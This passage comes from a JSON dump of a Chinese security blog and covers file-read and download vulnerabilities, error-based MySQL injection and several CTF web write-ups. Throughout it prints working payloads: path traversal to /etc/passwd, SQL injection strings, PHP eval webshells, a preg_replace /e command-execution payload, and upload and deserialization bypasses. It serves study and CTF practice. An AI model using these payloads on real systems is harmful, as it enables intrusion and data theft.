测试：readfile.php?f=../../../../../../etc/passwdreadfile.php?file=../../../../../../../../etc/passwd%00 readfile.php?f=../index.txt file://伪协议 ，读取文件内容readfile.php?f=file:///etc/passwd 任意文件下载验证示例代码：&lt;?php$filename = $_GET['f'];echo '&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;';echo file_get_contents($filename);header('Content-Type: imgage/jpeg');header('Content-Disposition: attachment; filename='.$filename);header('Content-Lengh: '.filesize($filename));?&gt; 当然，我下载这个文件并没有内容。 0x07漏洞判断参数f的参数值为PHP文件时： 1.文件被解析，则是文件包含漏洞2.显示源代码，则是文件查看漏洞3.提示下载，则是文件下载漏洞 0x08漏洞防御修复通用 过滤 . 点，使用户在url中不能回溯上级目录 正则严格判断用户输入的参数 php.ini配置open_basedir限定文件访问范围 文件下载漏洞修复 将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：http://www.test.com/download?filename=文件名 净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。 web应用程序可以使用chroot环境包含被访问的web目录，或者使用绝对路径+参数来访问文件目录，时使其即使越权也在访问目录之内。www目录就是一个chroot应用。由chroot创造出的那个根目录，叫做“chroot监狱”(所谓”监狱”就是指通过chroot机制来更改某个进程所能看到的根目录，即将某进程限制在指定目录中，保证该进程只能对该目录及其子目录的文件有所动作，从而保证整个服务器的安全。详细具体chroot的用法，可参考：http://blog.csdn.net/frozen_fish/article/details/2244870 任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。 要下载的文件地址保存至数据库中。 文件路径保存至数据库，让用户提交文件对应ID下载文件。 用户下载文件之前需要进行权限判断。 文件放在web无法直接访问的目录下。 不允许提供目录遍历服务。 公开文件可放置在web应用程序下载目录中通过链接进行下载。 记录文件下载日志。 0x09漏洞利用实战我学习任意文件读取与下载漏洞，就是因为遇到了一个任意文件读取与下载漏洞的Web题，所以在此实战一下RoarCTF2019-Web：Easy Java不是弱口令，也不能扫出目录。只有一个help.docx文件可以下载。于是可能是任意文件下载漏洞。点击蓝字“help”，抓包，发包。发现GET方式一直什么都下载不了。后来修改为POST，就可以下载了。因为题目提示java，所以可以先下载网站的配置文件，在根目录WEB-INF/web.xml发现操作flag的关键文件位置，读取(或下载)/WEB-INF/classes/下的flag的关键文件位置，又因为Java字节码类文件（.class）是Java编译器编译Java源文件（.java）产生的“目标文件”。最终得出flag的关键文件位置为：/WEB-INF/classes/com/wm/ctf/FlagController.classBase64解码得到flag","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"任意文件读取与下载漏洞","slug":"任意文件读取与下载漏洞","permalink":"https://qwzf.gitee.io/blog/tags/任意文件读取与下载漏洞/"}],"author":"qwzf"},{"title":"SQL注入-报错注入","slug":"SQL注入-报错注入","date":"2019-09-24T16:21:26.491Z","updated":"2019-11-16T17:15:45.107Z","comments":true,"path":"2019/09/25/SQL注入-报错注入/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/09/25/SQL注入-报错注入/","excerpt":"","text":"前言之前没有对SQL报错注入详细总结过，总结一下。 SQL报错注入利用前提: 页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()优点: 不需要显示位缺点: 需要输出 mysql_error( )的报错信息 12种SQL报错注入语句1、通过floor报错,注入语句如下:and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过extractvalue报错,注入语句如下:and (extractvalue(1,concat(0x7e,(select user()),0x7e))); 3、通过updatexml报错,注入语句如下:and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 4、通过exp报错,注入语句如下:and exp(~(select * from (select user () ) a) ); 5、通过join报错,注入语句如下:select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过NAME_CONST报错,注入语句如下:and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c); 7、通过GeometryCollection()报错,注入语句如下:and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下:and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下:and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下:and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下:and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下:and linestring (()select * from(select user() )a)b ); mysql 常用函数系统信息函数 database() 返回当前数据库名user()或system_user() 返回当前登陆用户名version() 或@@version 返回MySQL服务器的版本benchmapk(count,expr) 将表达式expr重复运行count次connection_id() 返回当前客户的连接IDfound_rows() 返回最后一个SELECT查询进行检索的总行数session_user() 连接数据库的用户名current_user 当前用户名load_file() 读取本地文件@@datadir 读取数据库路径@@basedir mysql安装路径@@version_complie_os 查看操作系统 更多参考：mysql 常用函数收集 常见SQL报错注入SQL注入有12个报错方式，比较常见的有floor报错注入、extractvalue报错注入、updatexml报错注入和exp报错注入 floor报错注入floor报错注入是利用 count()函数 、rand()函数 、floor()函数 、group by 这几个特定的函数结合在一起产生的注入漏洞。缺一不可select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); x和a是起的别名。 floor报错注入相关函数 count() 函数 count(*) 函数：返回表中的记录数 报错注入中，floor(rand(0)2)报错是有条件的，记录必须3条以上。所以使用count(\\) 函数 floor()函数：返回小于等于该值的最大整数（可以理解为向下取整，只保留整数部分） concat()函数：字符串拼接 报错注入中，利用concat()函数将想要获得的数据库内容拼接到concat()中，报错时作为内容输出。 rand()函数：可以用来生成0或1 rand(0)函数：也可以用来生成0或1 group by a 会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组. floor(rand(0)*2)，乘以 2的原因 rand() 是返回 0 到 1 之间的随机数（即使用floor()后，只可以返回0）, 那么乘 2 后自然是返回 0 到 2 之间的随机数（即使用floor()后，可以返回0和1） rand(0)函数和rand()函数的区别rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数生成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成。 报错分析rand()函数在查询的时候会执行一次，插入的时候还会执行一次（即使用rand()的话，会执行多次）。这是整个语句报错的关键floor(rand(0)*2) 前六位是011011。 group by a先建立一个空表，用于分组，然后进行分组查询。 第一次rand()执行，查询的结果是0。于是需要插入分组，就在这时，floor(rand(0)*2)再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ，表中的结果就是： root@localhost1 1 然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2） root@localhost1 2 遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后floor(rand(0)*2)又被触发，生成第五个值 1 ， root@localhost1 2 root@localhost1 因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了。此时插入因为重复出现同一个key，就会出现报错 重复出现key。而报错中会说明那个key有问题，key中结合了想要了解的字符串root@localhost这样就实现了报错注入。然后，concat()函数将想要获得的数据库内容拼接到concat()中，报错时作为内容输出。 （1）爆用户信息select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 用户：root（”1“是因为floor(rand(0)*2)随机返回1）（2）爆数据库名select * from users where id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a); 数据库名：security（3）爆数据表名select * from users where id=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a); 第四张表名：users（4）爆字段名select * from users where id=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); 第一个字段名：id第二个字段名：username第三个字段名：password（5）爆数据select * from users where id=1 and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); username字段下的第一条数据：Dumb extractvalue报错注入select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); EXTRACTVALUE (XML_document, XPath_string)第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) extractvalue(目标xml文档，xml路径)第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式。 如果我们写入其他格式，就会报错。并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。 爆用户信息select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); 用户：root两个”~“，是因为0x7e的ASCII码是”~“ updatexml报错注入select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); UPDATEXML (XML_document, XPath_string, new_value) 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据 updatexml()函数与extractvalue()类似，是更新xml文档的函数。updatexml(目标xml文档，xml路径，更新的内容)爆用户信息select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); exp报错注入exp溢出报错注入select * from users where id=1 and exp(~(select * from (select user())a)); exp是以e为底的指数函数mysql&gt; select exp(1);+-------------------+| exp(1) |+-------------------+| 2.718281828459045 |+-------------------+1 row in set (0.00 sec) 但是，数字太大会产生溢出。exp函数会在参数大于709时溢出，报错。mysql&gt; select exp(709);+-----------------------+| exp(709) |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)' 将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，将成功执行的函数取反就会得到最大的无符号BIGINT值。按位取反符：~按位取反：二进制每一位取反，0变1，1变0BIGINT：BIGINT[(M)] [UNSIGNED] [ZEROFILL] M默认为20大整数。带符号的范围是-9223372036854775808到9223372036854775807。无符号的范围是0到18446744073709551615。M代表的并不是存储在数据库中的具体的长度。mysql&gt; select ~0;+----------------------+| ~0 |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)mysql&gt; select ~(select user());+----------------------+| ~(select user()) |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec) 通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。mysql&gt; select * from users where id=1 and exp(~(select * from (select database())a));ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select `a`.`database()` from (select database() AS `database()`) `a`)))' 在脚本语言中，就会将错误中的一些表达式转化成相应的字符串。从而实现了报错注入。例如(我不演示了)：DOUBLE value is out of range in 'exp(~((select 'error_based_hpf' from dual)))' 结语总结之后，对SQL报错注入，又有了更加深入的认识。继续努力！","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://qwzf.gitee.io/blog/tags/SQL/"},{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"报错注入","slug":"报错注入","permalink":"https://qwzf.gitee.io/blog/tags/报错注入/"}],"author":"qwzf"},{"title":"攻防世界-Web(进阶区)","slug":"攻防世界-Web(进阶区)","date":"2019-09-05T15:46:17.151Z","updated":"2019-09-23T12:44:33.341Z","comments":true,"path":"2019/09/05/攻防世界-Web(进阶区)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/09/05/攻防世界-Web(进阶区)/","excerpt":"","text":"前言又做了几道攻防世界的Web题，总结一下。 Web1：Cat题目没提示。点开题目，以为是命令执行。然而几番尝试后，发现并不是。。。其它也没什么提示，没思路了。偷瞄大佬博客然后我开始复现，?url=%80产生报错，找到绝对路径。从配置文件settings.py的报错中查看database的相关信息?url=@/opt/api/api/settings.py ?url=@/opt/api/database.sqlite3，报错信息中搜索ctf Web2：ics-06题目提示：设备管理基础服务数据处，有入侵者的痕迹。这个地方应该就是题了。看到?id=1第一个想法便是SQL注入，结果失败了。偷瞄大佬博客，发现需要爆破。于是我爆破id值所以id=2333时，返回长度不同，即可能返回了flag，查看得到flag Web3：NewsCenteremmm。题目报错。。等题目正常了再更新总结。 Web4：mfw题目没提示，直接开始做题。先查看源码有个flag页面，直接尝试，发现返回空白页面。然后再次发现有效信息，发现下面这个Git？！难道存在git源码泄露。果然是使用GitHack.py工具下载源码，并打开assert()函数 检查一个断言是否为 FALSE。 bool assert ( mixed $assertion [, string $description ] ) 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。PHP 之 assert()函数strpos() 函数 查找字符串在另一字符串中第一次出现的位置。file_exists() 函数 检查文件或目录是否存在。审计源码：1、git传入page并赋值给$page。$file等于templates目录下的(page值).php文件内容2、如果strpos(&#39;$file&#39;, &#39;..&#39;) === false，$flie会被 assert() 当做 PHP 代码来执行。3、用file_exists() 函数检查$file文件是否存在。如果存在，返回文件内容。然后就是拼接构造payload了(又偷瞄了大佬博客)about.php', '123') === false and system('cat templates/flag.php') and strpos('templates/flag 最终，得到flag Web5：NaNNaNNaNNaN-Batman题目，没有提示，只有个文件，下载查看应该是js代码(涉及了我的盲区，所以偷瞄大佬博客)。eval() 函数:可计算某个字符串，并执行其中的的 JavaScript 代码。alert() 函数:用于显示带有一条指定消息和一个 确定按钮的警告框。 修改整理如下：function $()&#123;var e=document.getElementById(\"c\").value;if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null)&#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o)&#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125; &#125; document.write('&lt;input id=\"c\"&gt;&lt;button οnclick=$()&gt;Ok&lt;/button&gt;'); delete js代码一般可以在浏览器控制台执行。加上&lt;script&gt;&lt;/script&gt;标签也可以在html执行。控制台执行和html执行都是一个输入框。emmm。。。又不知道了(再次偷瞄)。方法一：审计代码，满足关键变量e的正则条件e.length==16e.match(/^be0f23/)!=nulle.match(/233ac/)!=nulle.match(/e98aa$/)!=nulle.match(/c7be9/)!=null ^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求 于是我们构造e的值：be0f233ac7be98aa 将构造的e输入到最初html执行的输入框中得到flag方法二：直接将下面代码复制到控制台执行var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"];var n=[\"a\",\"_h0l\",\"n\"];var r=[\"g&#123;\",\"e\",\"_0\"];var i=[\"it'\",\"_\",\"n\"];var s=[t,n,r,i];for(var o=0;o&lt;13;++o)&#123; document.write(s[o%4][0]);s[o%4].splice(0,1)&#125; Web6：uploademmm。题目报错。。等题目正常了再更新总结。 Web7：PHP2题目没有提示百度翻译一下，“你能浏览这个网站吗？”不能。。御剑扫描无果，源码也无发现。url后加index.php也不对。。。看大佬wp，竟然是url后加index.phps。。。urldecode()函数 解码 URL 字符串函数。此函数用于解码给出的已编码字符串中的任何 %##以及中文等被编码的内容。 （加号（’+’）被解码成一个空格字符）。该函数经常被使用于php解码URL中的中文字符串。相关函数：urlencode()函数，编码URL字符串函数。 审计代码，get传入的id经过urldecode()函数解码，如果解码结果为admin，输出“Access granted!”和Key值(即flag)。尝试对d进行url编码，即传入?id=a%64min，失败了。。。于是再次分析代码，发现是经过两次urlencode()函数解码。难道再对%编码？！%编码结果%25，传入?id=a%2564min，得到flag Web8：unserialize3题目提示unserialize，即反序列化。总结过，所以直接做题于是用serialize函数进行序列化(试过一句话，没有成功)&lt;?phpclass xctf&#123; var $flag = '111';&#125;$class1 = new xctf;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 测试，发现显示”bad requests“。查询百度发现，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。payload?code=O:4:\"xctf\":2:&#123;s:4:\"flag\";s:3:\"111\";&#125; 得到flag Web9：ics-05题目提示：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统所以工控云管理系统设备维护中心存在后门。查看源码几经尝试，发现，存在文件包含漏洞，可以使用php://filter伪协议对index.php进行读取Base64解码，找到关键代码如下：//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo \"&lt;br &gt;Welcome My Admin ! &lt;br &gt;\"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 代码审计一下：get传入pat、rep、sub并分别赋值给变量$pattern、$replacement、 $subject。如果设置了$pattern、$replacement、 $subject，执行preg_replace($pattern, $replacement, $subject);进行正则表达式的搜索和替换。 preg_replace( pattern , replacement , subject ) 函数当pattern指明/e标志时 ,preg_replace()会将replacement部分的代码当作PHP代码执行 (简单的说就是将replacement参数值放入eval()结构中)参考博客：深入研究PHP中的preg_replace和代码执行构造payload寻找flag：?pat=/test/e&amp;rep=system('find / -iname flag')&amp;sub=test 源码提示127.0.0.1，所以X-Forwarded-For进行欺骗，Forward发包ls查看flag目录内容再通过cat命令，查看flag.php内容。查看源码，得到flag Web10：bug题目没有提示。打开题目，注册用户。进入到设置密码页面，修改密码，抓包尝试更改用户名为admin。发包，提示IP禁止。所以XFF(X-Forwarded-For)欺骗：X-Forwarded-For: 127.0.0.1登录成功。Where Is The Flag？查看源码filemanage，文件管理？！我学过文件上传漏洞和文件包含漏洞。应该就是其中一种，尝试之后发现do=upload时，是文件上传页面。应该就是文件上传漏洞了上传测试发现，只能上传图片1、写一个php文件，后缀改为.jpg，抓包改为.php进行文件类型绕过，结果失败。2、.php改为.php3、.php5也是失败。3、又想到做i春秋Web题Upload时，用到&lt;script language=\"pHp\"&gt;@eval($_POST['a'])&lt;/script&gt; 于是尝试再尝试，发现后缀还要是.php3或.php5才能绕过发包得到flag Web11：Triangle还没搞懂，过段时间补上总结 Web12：web2题目提示：解密相关函数strrev()：反转字符串。str_rot13()：对字符串执行 ROT13 编码。base64_encode()：对数据进行base64编码base64_decode()：对数据进行base64解码审计php代码，写出PHP解密代码&lt;?php$miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function decode($miwen)&#123; $_o=base64_decode(strrev(str_rot13($miwen)));//echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++)&#123; $_c=substr($_o,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; &#125; return strrev($_);&#125;echo decode($miwen);?&gt; 还可以写成python脚本进行解密。我不太会写，引用大佬脚本：import base64def python_decode(string): zimu = \"abcdefghijklmnopqrstuvwxyz\" rot_13 =\"\" for i in string: if i.isdigit(): rot_13 += i else: try: rot_13 += zimu[zimu.index(i)-13] except: rot_13 += zimu[zimu.index(i.lower())-13].upper() fz = rot_13[::-1] base = base64.b64decode(fz) base = [chr(ord(i)-1) for i in base] fz = base[::-1] print \"\".join(fz)python_decode(\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\") 写在后面就先总结那么多吧，后边的题貌似很难。继续努力吧。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://qwzf.gitee.io/blog/tags/攻防世界/"}],"author":"qwzf"},{"title":"i春秋-Web(一)","slug":"i春秋-Web(一)","date":"2019-09-02T12:41:21.801Z","updated":"2019-09-02T12:50:53.079Z","comments":true,"path":"2019/09/02/i春秋-Web(一)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/09/02/i春秋-Web(一)/","excerpt":"","text":"前言做了几道i春秋的Web题，所以总结一下。 Web1：爆破-1题目提示：某六位变量。查看题目，发现是代码审计&lt;?phpinclude \"flag.php\";$a = @$_REQUEST['hello'];//以get或post传入hello，并赋值给`$a`if(!preg_match('/^\\w*$/',$a ))&#123;//正则表达式^匹配一行的开头，$表示结束。\\w表示匹配包括下划线的任何单词字符，等价于'[A-Za-z0-9_]'。*号：匹配前面的子表达式零次或多次。 die('ERROR');&#125;eval(\"var_dump($$a);\");show_source(__FILE__);//__FILE__当前运行文件的完整路径和文件名。?&gt; 1、如果匹配正则表达式/^\\w*$/，就打印变量 $$a2、$a是hello，$$a是六位变量$hello接下来不会了，所以百度一下发现超全局变量$GLOBALS作用：引用全局作用域中可用的全部变量。这样就会打印出当前定义的所有变量，也包括 include 的文件中的变量，flag 也存在在这些变量中。3、所以在URL后加?hello=GLOBALS，将参数hello修改为Globals实际执行语句：eval(\"var_dump($$a);\")eval(\"var_dump($hello);\")eval(\"var_dump($GLOBALS);\") 最终得到flag Web2：爆破-2题目提示：flag不在变量中审计代码，很明显是代码执行。一句话+菜刀(或蚁剑)拿到flagpyloadhttp://bd5c2e087fb744a4abb30339f0c088bfba3400c37b8245fe.changame.ichunqiu.com/?hello=$&#123;@eval($_POST[1])&#125; 同时发现我这道题有多种解法，可以参考大佬博客：【i春秋】 Web —— 爆破-2 Web3：爆破-3题目提示：这个真是爆破审计代码：1、Session中的num初始值为0，time为当前时间，whoami初始值为ea。2、120秒之后会话结束。然后str_rands随机生成2个字母。3、whoami需要等于传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++。4、whoami=str_rands，循环10次后，输出flag。 所以只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag。但不会写脚本，所以借鉴了一下大佬的脚本：import requestsurl = \"http://18db51d66abf489ca48f1c310b898ab8e4ba00cd266e4219.changame.ichunqiu.com/?value[]=ea\"al = ['abcdefghijklmnopqrstuvwxyz']s = requests.session()r=s.get(url)for i in range(20): url = \"http://18db51d66abf489ca48f1c310b898ab8e4ba00cd266e4219.changame.ichunqiu.com/?value[]=\" + r.content[0:2] r=s.get(url) print r.content Web4：Upload根据题目提示，这道题是文件上传漏洞。上传一句话查看，发现过滤了&lt;?php查询百度发现一句话也可以这样写：各种一句话木马大全找到一个。因为会过滤php，所以php写成pHp进行绕过。&lt;script language=\"pHp\"&gt;@eval($_POST['b'])&lt;/script&gt; 所以重新写下，然后上传。蚁剑(菜刀)一连成功然后就可以在后台找到flag了。 Web5：SQL题目提示：SQL注入flag在数据库。感觉可以联合查询注入。所以先判断整型还是字符型，是整型。查询列数，发现额。。不知道什么原因，感觉像是被过滤了什么。绕过，emmmm。。。没有绕过成功。查看大佬博客发现通过&lt;&gt;进行绕过大佬博客：一次简单的ctf SQL注入绕过试过后，发现只有ord&lt;&gt;er这种形式才能绕过。判断显示位，“2”处是显示位。接下来当然是爆库、爆表、爆字段、爆数据了。注意select和and的绕过就行了(sel&lt;&gt;ect an&lt;&gt;d)。最终得到flag Web6：include题目提示：文件包含漏洞因为PHP版本5.6.29，且allow_url_include为On、allow_url_fopen为Off。所以可以使用php伪协议读取POST数据，POST数据可以是命令执行代码，用ls查看当前目录。得到dle345aae.php，再用php://filter伪协议对文件进行读取，Base64转换一下，即可得到flag Web7：who are you?题目提示：who are you?(你是谁？)。一般情况下是admin抓包，发现一串像Base64的字符Base64解密结果是：f:5:&quot;thrfg&quot;;把thrfg换成admin，Base64加密，加密结果替换role值。发包没有得到flag。尝试无果，偷瞄一下大佬博客，rot13加密(凯撒密码码位移13)。。。解密结果：guest。脑洞挺大。不过也貌似比较好想到，admin(管理员账户)，想到guest(来宾账户)。所以admin，rot13加密、Base64加密。加密结果替换role值，发包得到提示文件上传，查看源码很明显应该一个是文件名，一个是数据先构造一下变量：filename=1.php&amp;data=&lt;?phpinfo();?&gt;得到NO NO NO应该是有正则匹配。不会绕，再次偷瞄大佬博客：利用数组绕过问题小总结php的函数一般都无法执行数组的，用数组来当参数，一般都能绕过。所以可以data[]，即filename=1.php&amp;data[]=&lt;?phpinfo();?&gt;。得到flag文件名访问，得到flag Web8：broken题目只提示了broken看到文件内容，很明显想到之前做过，是jsfuck编码。直接解，没解出来。因为题目已经提示文件损坏，所以了解一下jsfuck编码进行修复。JSfuck原理解析一JSFuck所以第一个[后应该加个]，jafuck解密弹出emmm，flag没在这？！应该还有要修的的地方。。不会了。。又一次偷瞄大佬博客：emmm，看了它一眼，然后没复现成功。 Web9：Do you know upload？Do you know upload？(你知道文件上传吗？)，我知道文件上传。进入题目查看源码很明显可以用php伪协议(php://filter)读取源码Base64解密，得到源码如下：&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;Upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;图片上传&lt;/h1&gt;&lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;Filename:&lt;/label&gt; &lt;input type=\"hidden\" name=\"dir\" value=\"/uploads/\" /&gt; &lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;br /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt;&lt;!-- include($_GET['file']); --&gt;&lt;?phpinclude($_GET['file']); @$pic = $_FILES[\"file\"][\"name\"];@$pics = explode('.' , $pic);if(@isset($_POST[submit]))&#123; if ((($_FILES[\"file\"][\"type\"] == \"image/gif\") || ($_FILES[\"file\"][\"type\"] == \"image/jpeg\") || ($_FILES[\"file\"][\"type\"] == \"image/pjpeg\")))&#123; if ($_FILES[\"file\"][\"error\"] &gt; 0)&#123; echo \"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"&lt;br /&gt;\"; &#125;else&#123; echo \"Upload: \" . $_FILES[\"file\"][\"name\"] . \"&lt;br /&gt;\"; echo \"Type: \" . $_FILES[\"file\"][\"type\"] . \"&lt;br /&gt;\"; echo \"Size: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" Kb&lt;br /&gt;\"; //echo \"Temp file: \" . $_FILES[\"file\"][\"tmp_name\"] . \"&lt;br /&gt;\"; if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"]))&#123; echo $_FILES[\"file\"][\"name\"] . \" already exists. \"; &#125;else&#123; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"Stored in: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; &#125; &#125; &#125;else&#123; echo \"&lt;script&gt;alert('文件类型不允许')&lt;/script&gt;\"; echo \"Invalid file\"; &#125;&#125;else&#123; // echo \"Invalid file\";&#125;?&gt;&lt;/body&gt;&lt;/html&gt; 代码审计一下：黑名单，文件类型只能是image/gif、image/jpeg、image/pjpeg。所以，先将php一句话，文件后缀改为.jpg。上传、抓包，将.jpg改为.php。上传成功蚁剑(菜刀)一连，连接成功没有发现flag，发现了config.php。打开，里面有数据库用户名、密码、数据库名。蚁剑连接数据库，得到flag Web10：Login打开题目查看源码，在最下方发现应该就是用户名和密码，登录只有这个。。。源码也没有有用信息抓包，发包响应头里发现特殊的东西show，且值为0。一般0表示假，1为真。所以在请求头里将show的值写为1，发包得到源码&lt;?php include 'common.php'; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); class db &#123; public $where; function __wakeup() &#123; if(!empty($this-&gt;where)) &#123; $this-&gt;select($this-&gt;where); &#125; &#125; function select($where) &#123; $sql = mysql_query('select * from user where '.$where); return @mysql_fetch_array($sql); &#125; &#125; if(isset($requset['token'])) &#123; $login = unserialize(gzuncompress(base64_decode($requset['token']))); $db = new db(); $row = $db-&gt;select('user=\\''.mysql_real_escape_string($login['user']).'\\''); if($login['user'] === 'ichunqiu') &#123; echo $flag; &#125;else if($row['pass'] !== $login['pass'])&#123; echo 'unserialize injection!!'; &#125;else&#123; echo \"(╯‵□′)╯︵┴─┴ \"; &#125; &#125;else&#123; header('Location: index.php?error=1'); &#125;?&gt; 审计代码，发现只要$login = unserialize(gzuncompress(base64_decode(requset[′token′])))之后，requset[′token′])))之后，login[‘user’] === &#39;ichunqiu’即可。然后写到cookie中的token中就行了，这个时候也必须有show: 1，发包得到flag。 